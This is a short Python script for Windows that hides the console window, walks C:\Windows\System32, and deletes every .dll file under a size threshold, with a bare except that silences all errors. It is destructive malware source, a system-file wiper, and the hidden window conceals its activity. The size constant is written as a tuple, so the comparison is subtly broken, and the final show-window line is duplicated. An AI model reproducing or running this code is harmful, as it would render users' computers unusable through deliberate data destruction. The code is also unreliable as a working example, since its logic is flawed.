import os, win32gui, win32con

# Hide CMD
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)

clear = lambda: os.system('cls' or "clear")
clear()

# Path to inspect
path = "C:\\Windows\\System32\\"

# Max file size
maxFileSize = 21,182,681

# File extensions we want to collect 
EXTENSIONS = {".dll"} 

try: 
    for dirname, dirpaths, filenames in os.walk(path):
        for filename in filenames:
            ext = os.path.splitext(filename)[-1]
            # checks if a file has the specified extensions
            if ext in EXTENSIONS:
                x = os.path.join(dirname, filename)
                # Checks if file doesn't have a large size
                if os.path.getsize(x) < maxFileSize:
                    # REMOVING FILES
                    os.remove(x)
                    print("Deleted!")
except:
    pass
    
# Show CMD
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)
    

win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)
